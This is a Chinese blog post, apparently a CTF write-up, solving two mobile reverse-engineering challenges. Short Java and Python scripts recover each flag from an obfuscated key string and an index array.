<h1 id="MOBILE-4-The-Marauder’s-Map"><a href="#MOBILE-4-The-Marauder’s-Map" class="headerlink" title="MOBILE 4 The Marauder’s Map"></a>MOBILE 4 The Marauder’s Map</h1><p>本题使用双字节混淆，众所周知java是支持双字节变量名的，也就是说你可以起中文的变量名，这并不影响编译，因此可以直接反编译class代码，然后直接重新编译运行就好了。<br>这个题使用的是自己的system类，因此要注意不要和系统的system类弄混了。<br>这个题首先由一个复杂的字符串每个字符右移一位生成一个密钥，然后遍历输入，计算当前索引的斐波那契数列的值，作为对密钥的索引，然后拼接起来就是目标flag。<br>这里密钥的获取只能用java来实现，其余可以用Python来实现。<br>代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   String x = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">char</span>[] var5;</span><br><span class="line">   <span class="keyword">int</span> var4 = (var5 = <span class="string">"vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬"</span>.toCharArray()).length;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var4; ++var3) &#123;</span><br><span class="line">      <span class="keyword">char</span> $ = var5[var3];</span><br><span class="line">      x = x + (<span class="keyword">char</span>)(($ &gt;&gt; <span class="number">1</span>) + <span class="number">15</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> f(i - <span class="number">1</span>) + f(i - <span class="number">2</span>) <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(i, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> f(i) % len(s)</span><br><span class="line">key = <span class="string">"JsnatterrtJuaththovacke"</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l.append(key[d(i + k, key)])</span><br><span class="line">    l.append(<span class="string">'-'</span>)</span><br><span class="line">    i += <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<h1 id="MOBILE-5-取证密码"><a href="#MOBILE-5-取证密码" class="headerlink" title="MOBILE 5 取证密码"></a>MOBILE 5 取证密码</h1><p>本题lib中有一个字符串和一个整数数组，只要按整数数组里的顺序从字符串中取出字符，拼接起来就是flag<br>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W'</span></span><br><span class="line">l = [<span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0xA</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x13</span>, <span class="number">2</span>, <span class="number">0x3A</span>, <span class="number">0xC</span>, <span class="number">0x11</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>, <span class="number">0xB</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.append(key[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</span><br></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/1503017cb0e6341b.png" alt=""></p>
</div></article></div></main><footer><div class="paginator"><a href="/2018/07/08/一个alfred-npmjs小工具/" class="prev">PREV</a><a href="/2018/07/08/Nisp之道/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="https://www.ycjcl.cc">Kylin King</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>